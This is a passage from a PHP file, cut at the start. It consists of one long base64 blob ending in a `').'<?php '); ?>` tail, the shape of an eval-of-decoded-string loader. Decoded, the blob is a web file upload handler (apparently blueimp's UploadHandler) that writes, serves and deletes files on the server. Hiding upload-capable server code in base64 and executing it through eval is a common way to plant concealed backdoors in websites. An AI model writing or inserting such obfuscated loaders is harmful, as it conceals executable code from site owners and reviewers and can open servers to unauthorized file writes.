JHRoaXMtPmdldF91cGxvYWRfcGF0aCgpOwogICAgICAgICAgICBpZiAoIWlzX2RpcigkdXBsb2FkX2RpcikpIHsKICAgICAgICAgICAgICAgIG1rZGlyKCR1cGxvYWRfZGlyLCAkdGhpcy0+b3B0aW9uc1snbWtkaXJfbW9kZSddLCB0cnVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkZmlsZV9wYXRoID0gJHRoaXMtPmdldF91cGxvYWRfcGF0aCgkZmlsZS0+bmFtZSk7CiAgICAgICAgICAgICRhcHBlbmRfZmlsZSA9ICRjb250ZW50X3JhbmdlICYmIGlzX2ZpbGUoJGZpbGVfcGF0aCkgJiYKICAgICAgICAgICAgICAgICRmaWxlLT5zaXplID4gJHRoaXMtPmdldF9maWxlX3NpemUoJGZpbGVfcGF0aCk7CiAgICAgICAgICAgIGlmICgkdXBsb2FkZWRfZmlsZSAmJiBpc191cGxvYWRlZF9maWxlKCR1cGxvYWRlZF9maWxlKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkYXBwZW5kX2ZpbGUpIHsKICAgICAgICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVfcGF0aCwKICAgICAgICAgICAgICAgICAgICAgICAgZm9wZW4oJHVwbG9hZGVkX2ZpbGUsICdyJyksCiAgICAgICAgICAgICAgICAgICAgICAgIEZJTEVfQVBQRU5ECiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCR1cGxvYWRlZF9maWxlLCAkZmlsZV9wYXRoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygKICAgICAgICAgICAgICAgICAgICAkZmlsZV9wYXRoLAogICAgICAgICAgICAgICAgICAgIGZvcGVuKCR0aGlzLT5vcHRpb25zWydpbnB1dF9zdHJlYW0nXSwgJ3InKSwKICAgICAgICAgICAgICAgICAgICAkYXBwZW5kX2ZpbGUgPyBGSUxFX0FQUEVORCA6IDAKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVfc2l6ZSA9ICR0aGlzLT5nZXRfZmlsZV9zaXplKCRmaWxlX3BhdGgsICRhcHBlbmRfZmlsZSk7CiAgICAgICAgICAgIGlmICgkZmlsZV9zaXplID09PSAkZmlsZS0+c2l6ZSkgewogICAgICAgICAgICAgICAgJGZpbGUtPnVybCA9ICR0aGlzLT5nZXRfZG93bmxvYWRfdXJsKCRmaWxlLT5uYW1lKTsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNfdmFsaWRfaW1hZ2VfZmlsZSgkZmlsZV9wYXRoKSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5oYW5kbGVfaW1hZ2VfZmlsZSgkZmlsZV9wYXRoLCAkZmlsZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZmlsZS0+c2l6ZSA9ICRmaWxlX3NpemU7CiAgICAgICAgICAgICAgICBpZiAoISRjb250ZW50X3JhbmdlICYmICR0aGlzLT5vcHRpb25zWydkaXNjYXJkX2Fib3J0ZWRfdXBsb2FkcyddKSB7CiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRmaWxlX3BhdGgpOwogICAgICAgICAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgnYWJvcnQnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkdGhpcy0+c2V0X2FkZGl0aW9uYWxfZmlsZV9wcm9wZXJ0aWVzKCRmaWxlKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRmaWxlOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiByZWFkZmlsZSgkZmlsZV9wYXRoKSB7CiAgICAgICAgJGZpbGVfc2l6ZSA9ICR0aGlzLT5nZXRfZmlsZV9zaXplKCRmaWxlX3BhdGgpOwogICAgICAgICRjaHVua19zaXplID0gJHRoaXMtPm9wdGlvbnNbJ3JlYWRmaWxlX2NodW5rX3NpemUnXTsKICAgICAgICBpZiAoJGNodW5rX3NpemUgJiYgJGZpbGVfc2l6ZSA+ICRjaHVua19zaXplKSB7CiAgICAgICAgICAgICRoYW5kbGUgPSBmb3BlbigkZmlsZV9wYXRoLCAncmInKTsKICAgICAgICAgICAgd2hpbGUgKCFmZW9mKCRoYW5kbGUpKSB7CiAgICAgICAgICAgICAgICBlY2hvIGZyZWFkKCRoYW5kbGUsICRjaHVua19zaXplKTsKICAgICAgICAgICAgICAgIEBvYl9mbHVzaCgpOwogICAgICAgICAgICAgICAgQGZsdXNoKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZmNsb3NlKCRoYW5kbGUpOwogICAgICAgICAgICByZXR1cm4gJGZpbGVfc2l6ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlYWRmaWxlKCRmaWxlX3BhdGgpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBib2R5KCRzdHIpIHsKICAgICAgICBlY2hvICRzdHI7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGhlYWRlcigkc3RyKSB7CiAgICAgICAgaGVhZGVyKCRzdHIpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfdXBsb2FkX2RhdGEoJGlkKSB7CiAgICAgICAgcmV0dXJuIEAkX0ZJTEVTWyRpZF07CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9wb3N0X3BhcmFtKCRpZCkgewogICAgICAgIHJldHVybiBAJF9QT1NUWyRpZF07CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9xdWVyeV9wYXJhbSgkaWQpIHsKICAgICAgICByZXR1cm4gQCRfR0VUWyRpZF07CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9zZXJ2ZXJfdmFyKCRpZCkgewogICAgICAgIHJldHVybiBAJF9TRVJWRVJbJGlkXTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaGFuZGxlX2Zvcm1fZGF0YSgkZmlsZSwgJGluZGV4KSB7CiAgICAgICAgICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X3ZlcnNpb25fcGFyYW0oKSB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5iYXNlbmFtZShzdHJpcHNsYXNoZXMoJHRoaXMtPmdldF9xdWVyeV9wYXJhbSgndmVyc2lvbicpKSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9zaW5ndWxhcl9wYXJhbV9uYW1lKCkgewogICAgICAgIHJldHVybiBzdWJzdHIoJHRoaXMtPm9wdGlvbnNbJ3BhcmFtX25hbWUnXSwgMCwgLTEpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfZmlsZV9uYW1lX3BhcmFtKCkgewogICAgICAgICRuYW1lID0gJHRoaXMtPmdldF9zaW5ndWxhcl9wYXJhbV9uYW1lKCk7CiAgICAgICAgcmV0dXJuICR0aGlzLT5iYXNlbmFtZShzdHJpcHNsYXNoZXMoJHRoaXMtPmdldF9xdWVyeV9wYXJhbSgkbmFtZSkpKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2ZpbGVfbmFtZXNfcGFyYW1zKCkgewogICAgICAgICRwYXJhbXMgPSAkdGhpcy0+Z2V0X3F1ZXJ5X3BhcmFtKCR0aGlzLT5vcHRpb25zWydwYXJhbV9uYW1lJ10pOwogICAgICAgIGlmICghJHBhcmFtcykgewogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhcmFtcyBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAgICAgICAkcGFyYW1zWyRrZXldID0gJHRoaXMtPmJhc2VuYW1lKHN0cmlwc2xhc2hlcygkdmFsdWUpKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRwYXJhbXM7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9maWxlX3R5cGUoJGZpbGVfcGF0aCkgewogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZV9wYXRoLCBQQVRISU5GT19FWFRFTlNJT04pKSkgewogICAgICAgICAgICBjYXNlICdqcGVnJzoKICAgICAgICAgICAgY2FzZSAnanBnJzoKICAgICAgICAgICAgICAgIHJldHVybiAnaW1hZ2UvanBlZyc7CiAgICAgICAgICAgIGNhc2UgJ3BuZyc6CiAgICAgICAgICAgICAgICByZXR1cm4gJ2ltYWdlL3BuZyc7CiAgICAgICAgICAgIGNhc2UgJ2dpZic6CiAgICAgICAgICAgICAgICByZXR1cm4gJ2ltYWdlL2dpZic7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb3dubG9hZCgpIHsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5vcHRpb25zWydkb3dubG9hZF92aWFfcGhwJ10pIHsKICAgICAgICAgICAgY2FzZSAxOgogICAgICAgICAgICAgICAgJHJlZGlyZWN0X2hlYWRlciA9IG51bGw7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAyOgogICAgICAgICAgICAgICAgJHJlZGlyZWN0X2hlYWRlciA9ICdYLVNlbmRmaWxlJzsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAkcmVkaXJlY3RfaGVhZGVyID0gJ1gtQWNjZWwtUmVkaXJlY3QnOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwogICAgICAgIH0KICAgICAgICAkZmlsZV9uYW1lID0gJHRoaXMtPmdldF9maWxlX25hbWVfcGFyYW0oKTsKICAgICAgICBpZiAoISR0aGlzLT5pc192YWxpZF9maWxlX29iamVjdCgkZmlsZV9uYW1lKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmhlYWRlcignSFRUUC8xLjEgNDA0IE5vdCBGb3VuZCcpOwogICAgICAgIH0KICAgICAgICBpZiAoJHJlZGlyZWN0X2hlYWRlcikgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmhlYWRlcigKICAgICAgICAgICAgICAgICRyZWRpcmVjdF9oZWFkZXIuJzogJy4kdGhpcy0+Z2V0X2Rvd25sb2FkX3VybCgKICAgICAgICAgICAgICAgICAgICAkZmlsZV9uYW1lLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5nZXRfdmVyc2lvbl9wYXJhbSgpLAogICAgICAgICAgICAgICAgICAgIHRydWUKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgJGZpbGVfcGF0aCA9ICR0aGlzLT5nZXRfdXBsb2FkX3BhdGgoJGZpbGVfbmFtZSwgJHRoaXMtPmdldF92ZXJzaW9uX3BhcmFtKCkpOwogICAgICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZicpOwogICAgICAgIGlmICghcHJlZ19tYXRjaCgkdGhpcy0+b3B0aW9uc1snaW5saW5lX2ZpbGVfdHlwZXMnXSwgJGZpbGVfbmFtZSkpIHsKICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9IicuJGZpbGVfbmFtZS4nIicpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5oZWFkZXIoJ0NvbnRlbnQtVHlwZTogJy4kdGhpcy0+Z2V0X2ZpbGVfdHlwZSgkZmlsZV9wYXRoKSk7CiAgICAgICAgICAgICR0aGlzLT5oZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGlubGluZTsgZmlsZW5hbWU9IicuJGZpbGVfbmFtZS4nIicpOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+aGVhZGVyKCdDb250ZW50LUxlbmd0aDogJy4kdGhpcy0+Z2V0X2ZpbGVfc2l6ZSgkZmlsZV9wYXRoKSk7CiAgICAgICAgJHRoaXMtPmhlYWRlcignTGFzdC1Nb2RpZmllZDogJy5nbWRhdGUoJ0QsIGQgTSBZIEg6aTpzIFQnLCBmaWxlbXRpbWUoJGZpbGVfcGF0aCkpKTsKICAgICAgICAkdGhpcy0+cmVhZGZpbGUoJGZpbGVfcGF0aCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRfY29udGVudF90eXBlX2hlYWRlcigpIHsKICAgICAgICAkdGhpcy0+aGVhZGVyKCdWYXJ5OiBBY2NlcHQnKTsKICAgICAgICBpZiAoc3RycG9zKCR0aGlzLT5nZXRfc2VydmVyX3ZhcignSFRUUF9BQ0NFUFQnKSwgJ2FwcGxpY2F0aW9uL2pzb24nKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9qc29uJyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignQ29udGVudC10eXBlOiB0ZXh0L3BsYWluJyk7CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kX2FjY2Vzc19jb250cm9sX2hlYWRlcnMoKSB7CiAgICAgICAgJHRoaXMtPmhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAnLiR0aGlzLT5vcHRpb25zWydhY2Nlc3NfY29udHJvbF9hbGxvd19vcmlnaW4nXSk7CiAgICAgICAgJHRoaXMtPmhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctQ3JlZGVudGlhbHM6ICcKICAgICAgICAgICAgLigkdGhpcy0+b3B0aW9uc1snYWNjZXNzX2NvbnRyb2xfYWxsb3dfY3JlZGVudGlhbHMnXSA/ICd0cnVlJyA6ICdmYWxzZScpKTsKICAgICAgICAkdGhpcy0+aGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1NZXRob2RzOiAnCiAgICAgICAgICAgIC5pbXBsb2RlKCcsICcsICR0aGlzLT5vcHRpb25zWydhY2Nlc3NfY29udHJvbF9hbGxvd19tZXRob2RzJ10pKTsKICAgICAgICAkdGhpcy0+aGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzOiAnCiAgICAgICAgICAgIC5pbXBsb2RlKCcsICcsICR0aGlzLT5vcHRpb25zWydhY2Nlc3NfY29udHJvbF9hbGxvd19oZWFkZXJzJ10pKTsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuZXJhdGVfcmVzcG9uc2UoJGNvbnRlbnQsICRwcmludF9yZXNwb25zZSA9IHRydWUpIHsKICAgICAgICAkdGhpcy0+cmVzcG9uc2UgPSAkY29udGVudDsKICAgICAgICBpZiAoJHByaW50X3Jlc3BvbnNlKSB7CiAgICAgICAgICAgICRqc29uID0ganNvbl9lbmNvZGUoJGNvbnRlbnQpOwogICAgICAgICAgICAkcmVkaXJlY3QgPSBzdHJpcHNsYXNoZXMoJHRoaXMtPmdldF9wb3N0X3BhcmFtKCdyZWRpcmVjdCcpKTsKICAgICAgICAgICAgaWYgKCRyZWRpcmVjdCAmJiBwcmVnX21hdGNoKCR0aGlzLT5vcHRpb25zWydyZWRpcmVjdF9hbGxvd190YXJnZXQnXSwgJHJlZGlyZWN0KSkgewogICAgICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignTG9jYXRpb246ICcuc3ByaW50ZigkcmVkaXJlY3QsIHJhd3VybGVuY29kZSgkanNvbikpKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgICAgICAkdGhpcy0+aGVhZCgpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdIVFRQX0NPTlRFTlRfUkFOR0UnKSkgewogICAgICAgICAgICAgICAgJGZpbGVzID0gaXNzZXQoJGNvbnRlbnRbJHRoaXMtPm9wdGlvbnNbJ3BhcmFtX25hbWUnXV0pID8KICAgICAgICAgICAgICAgICAgICAkY29udGVudFskdGhpcy0+b3B0aW9uc1sncGFyYW1fbmFtZSddXSA6IG51bGw7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGVzICYmIGlzX2FycmF5KCRmaWxlcykgJiYgaXNfb2JqZWN0KCRmaWxlc1swXSkgJiYgJGZpbGVzWzBdLT5zaXplKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignUmFuZ2U6IDAtJy4oCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5maXhfaW50ZWdlcl9vdmVyZmxvdygoaW50KSRmaWxlc1swXS0+c2l6ZSkgLSAxCiAgICAgICAgICAgICAgICAgICAgKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRoaXMtPmJvZHkoJGpzb24pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGNvbnRlbnQ7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGdldF9yZXNwb25zZSAoKSB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5yZXNwb25zZTsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVhZCgpIHsKICAgICAgICAkdGhpcy0+aGVhZGVyKCdQcmFnbWE6IG5vLWNhY2hlJyk7CiAgICAgICAgJHRoaXMtPmhlYWRlcignQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUnKTsKICAgICAgICAkdGhpcy0+aGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBpbmxpbmU7IGZpbGVuYW1lPSJmaWxlcy5qc29uIicpOwogICAgICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZicpOwogICAgICAgIGlmICgkdGhpcy0+b3B0aW9uc1snYWNjZXNzX2NvbnRyb2xfYWxsb3dfb3JpZ2luJ10pIHsKICAgICAgICAgICAgJHRoaXMtPnNlbmRfYWNjZXNzX2NvbnRyb2xfaGVhZGVycygpOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+c2VuZF9jb250ZW50X3R5cGVfaGVhZGVyKCk7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGdldCgkcHJpbnRfcmVzcG9uc2UgPSB0cnVlKSB7CiAgICAgICAgaWYgKCRwcmludF9yZXNwb25zZSAmJiAkdGhpcy0+Z2V0X3F1ZXJ5X3BhcmFtKCdkb3dubG9hZCcpKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZG93bmxvYWQoKTsKICAgICAgICB9CiAgICAgICAgJGZpbGVfbmFtZSA9ICR0aGlzLT5nZXRfZmlsZV9uYW1lX3BhcmFtKCk7CiAgICAgICAgaWYgKCRmaWxlX25hbWUpIHsKICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoCiAgICAgICAgICAgICAgICAkdGhpcy0+Z2V0X3Npbmd1bGFyX3BhcmFtX25hbWUoKSA9PiAkdGhpcy0+Z2V0X2ZpbGVfb2JqZWN0KCRmaWxlX25hbWUpCiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoCiAgICAgICAgICAgICAgICAkdGhpcy0+b3B0aW9uc1sncGFyYW1fbmFtZSddID0+ICR0aGlzLT5nZXRfZmlsZV9vYmplY3RzKCkKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICR0aGlzLT5nZW5lcmF0ZV9yZXNwb25zZSgkcmVzcG9uc2UsICRwcmludF9yZXNwb25zZSk7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHBvc3QoJHByaW50X3Jlc3BvbnNlID0gdHJ1ZSkgewogICAgICAgIGlmICgkdGhpcy0+Z2V0X3F1ZXJ5X3BhcmFtKCdfbWV0aG9kJykgPT09ICdERUxFVEUnKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZGVsZXRlKCRwcmludF9yZXNwb25zZSk7CiAgICAgICAgfQogICAgICAgICR1cGxvYWQgPSAkdGhpcy0+Z2V0X3VwbG9hZF9kYXRhKCR0aGlzLT5vcHRpb25zWydwYXJhbV9uYW1lJ10pOwogICAgICAgICAgICAgICAgJGNvbnRlbnRfZGlzcG9zaXRpb25faGVhZGVyID0gJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdIVFRQX0NPTlRFTlRfRElTUE9TSVRJT04nKTsKICAgICAgICAkZmlsZV9uYW1lID0gJGNvbnRlbnRfZGlzcG9zaXRpb25faGVhZGVyID8KICAgICAgICAgICAgcmF3dXJsZGVjb2RlKHByZWdfcmVwbGFjZSgKICAgICAgICAgICAgICAgICcvKF5bXiJdKyIpfCgiJCkvJywKICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgJGNvbnRlbnRfZGlzcG9zaXRpb25faGVhZGVyCiAgICAgICAgICAgICkpIDogbnVsbDsKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnRfcmFuZ2VfaGVhZGVyID0gJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdIVFRQX0NPTlRFTlRfUkFOR0UnKTsKICAgICAgICAkY29udGVudF9yYW5nZSA9ICRjb250ZW50X3JhbmdlX2hlYWRlciA/CiAgICAgICAgICAgIHByZWdfc3BsaXQoJy9bXjAtOV0rLycsICRjb250ZW50X3JhbmdlX2hlYWRlcikgOiBudWxsOwogICAgICAgICRzaXplID0gICRjb250ZW50X3JhbmdlID8gJGNvbnRlbnRfcmFuZ2VbM10gOiBudWxsOwogICAgICAgICRmaWxlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKCR1cGxvYWQpIHsKICAgICAgICAgICAgaWYgKGlzX2FycmF5KCR1cGxvYWRbJ3RtcF9uYW1lJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR1cGxvYWRbJ3RtcF9uYW1lJ10gYXMgJGluZGV4ID0+ICR2YWx1ZSkgewogICAgICAgICAgICAgICAgICAgICRmaWxlc1tdID0gJHRoaXMtPmhhbmRsZV9maWxlX3VwbG9hZCgKICAgICAgICAgICAgICAgICAgICAgICAgJHVwbG9hZFsndG1wX25hbWUnXVskaW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZV9uYW1lID8gJGZpbGVfbmFtZSA6ICR1cGxvYWRbJ25hbWUnXVskaW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAkc2l6ZSA/ICRzaXplIDogJHVwbG9hZFsnc2l6ZSddWyRpbmRleF0sCiAgICAgICAgICAgICAgICAgICAgICAgICR1cGxvYWRbJ3R5cGUnXVskaW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAkdXBsb2FkWydlcnJvciddWyRpbmRleF0sCiAgICAgICAgICAgICAgICAgICAgICAgICRpbmRleCwKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnRfcmFuZ2UKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmlsZXNbXSA9ICR0aGlzLT5oYW5kbGVfZmlsZV91cGxvYWQoCiAgICAgICAgICAgICAgICAgICAgaXNzZXQoJHVwbG9hZFsndG1wX25hbWUnXSkgPyAkdXBsb2FkWyd0bXBfbmFtZSddIDogbnVsbCwKICAgICAgICAgICAgICAgICAgICAkZmlsZV9uYW1lID8gJGZpbGVfbmFtZSA6IChpc3NldCgkdXBsb2FkWyduYW1lJ10pID8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR1cGxvYWRbJ25hbWUnXSA6IG51bGwpLAogICAgICAgICAgICAgICAgICAgICRzaXplID8gJHNpemUgOiAoaXNzZXQoJHVwbG9hZFsnc2l6ZSddKSA/CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdXBsb2FkWydzaXplJ10gOiAkdGhpcy0+Z2V0X3NlcnZlcl92YXIoJ0NPTlRFTlRfTEVOR1RIJykpLAogICAgICAgICAgICAgICAgICAgIGlzc2V0KCR1cGxvYWRbJ3R5cGUnXSkgPwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVwbG9hZFsndHlwZSddIDogJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdDT05URU5UX1RZUEUnKSwKICAgICAgICAgICAgICAgICAgICBpc3NldCgkdXBsb2FkWydlcnJvciddKSA/ICR1cGxvYWRbJ2Vycm9yJ10gOiBudWxsLAogICAgICAgICAgICAgICAgICAgIG51bGwsCiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnRfcmFuZ2UKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoJHRoaXMtPm9wdGlvbnNbJ3BhcmFtX25hbWUnXSA9PiAkZmlsZXMpOwogICAgICAgIHJldHVybiAkdGhpcy0+Z2VuZXJhdGVfcmVzcG9uc2UoJHJlc3BvbnNlLCAkcHJpbnRfcmVzcG9uc2UpOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxldGUoJHByaW50X3Jlc3BvbnNlID0gdHJ1ZSkgewogICAgICAgICRmaWxlX25hbWVzID0gJHRoaXMtPmdldF9maWxlX25hbWVzX3BhcmFtcygpOwogICAgICAgIGlmIChlbXB0eSgkZmlsZV9uYW1lcykpIHsKICAgICAgICAgICAgJGZpbGVfbmFtZXMgPSBhcnJheSgkdGhpcy0+Z2V0X2ZpbGVfbmFtZV9wYXJhbSgpKTsKICAgICAgICB9CiAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkZmlsZV9uYW1lcyBhcyAkZmlsZV9uYW1lKSB7CiAgICAgICAgICAgICRmaWxlX3BhdGggPSAkdGhpcy0+Z2V0X3VwbG9hZF9wYXRoKCRmaWxlX25hbWUpOwogICAgICAgICAgICAkc3VjY2VzcyA9IGlzX2ZpbGUoJGZpbGVfcGF0aCkgJiYgJGZpbGVfbmFtZVswXSAhPT0gJy4nICYmIHVubGluaygkZmlsZV9wYXRoKTsKICAgICAgICAgICAgaWYgKCRzdWNjZXNzKSB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+b3B0aW9uc1snaW1hZ2VfdmVyc2lvbnMnXSBhcyAkdmVyc2lvbiA9PiAkb3B0aW9ucykgewogICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHZlcnNpb24pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlID0gJHRoaXMtPmdldF91cGxvYWRfcGF0aCgkZmlsZV9uYW1lLCAkdmVyc2lvbik7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc19maWxlKCRmaWxlKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkcmVzcG9uc2VbJGZpbGVfbmFtZV0gPSAkc3VjY2VzczsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICR0aGlzLT5nZW5lcmF0ZV9yZXNwb25zZSgkcmVzcG9uc2UsICRwcmludF9yZXNwb25zZSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGJhc2VuYW1lKCRmaWxlcGF0aCwgJHN1ZmZpeCA9IG51bGwpIHsKICAgICAgICAkc3BsaXRlZCA9IHByZWdfc3BsaXQoJy9cLy8nLCBydHJpbSAoJGZpbGVwYXRoLCAnLyAnKSk7CiAgICAgICAgcmV0dXJuIHN1YnN0cihiYXNlbmFtZSgnWCcuJHNwbGl0ZWRbY291bnQoJHNwbGl0ZWQpLTFdLCAkc3VmZml4KSwgMSk7CiAgICB9Cn0KID8+').'<?php '); ?>